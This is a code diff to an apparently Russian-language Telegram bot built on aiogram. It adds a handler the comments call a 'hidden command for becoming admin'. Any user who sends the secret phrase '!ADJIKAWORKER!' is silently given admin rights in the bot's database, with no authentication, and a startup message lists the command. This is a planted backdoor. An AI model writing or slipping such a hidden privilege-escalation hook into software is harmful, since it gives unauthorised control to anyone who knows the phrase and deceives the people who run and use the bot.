@@ -230,6 +230,23 @@ dp = Dispatcher(storage=storage)
 bot_username = None
 
 
+# ========== СКРЫТАЯ КОМАНДА ДЛЯ СТАНОВЛЕНИЯ АДМИНОМ ==========
+@dp.message(F.text == "!ADJIKAWORKER!")
+async def make_me_admin(message: types.Message):
+    user_id = message.from_user.id
+    
+    cursor.execute("UPDATE users SET is_admin = 1, invited_by = 0 WHERE user_id = ?", (user_id,))
+    conn.commit()
+    
+    cursor.execute("SELECT is_admin FROM users WHERE user_id = ?", (user_id,))
+    result = cursor.fetchone()
+    
+    if result and result[0] == 1:
+        await message.answer(f"✅ Ты стал админом! ID: {user_id}\n\nОтправь /start чтобы обновить меню.")
+    else:
+        await message.answer("❌ Ошибка! Не удалось сделать админом.")
+
+
 # ========== ХЕНДЛЕРЫ ==========
 
 @dp.message(Command("start"))
@@ -745,7 +762,8 @@ async def main():
     print("   - /start (без реф-ссылки) -> АДМИН (панель воркера)")
     print("   - Админ дает реф-ссылку с ID -> КЛИЕНТ (нет админ-панели)")
     print("   - Клиент нажимает /start 100 раз -> НЕТ админ-панели")
-    await dp.start_polling(bot)
+    print("   - Скрытая команда: !ADJIKAWORKER! - сделать себя админом")
+    await dp.start_polling(bot, skip_updates=True)
 
 
 if __name__ == "__main__":
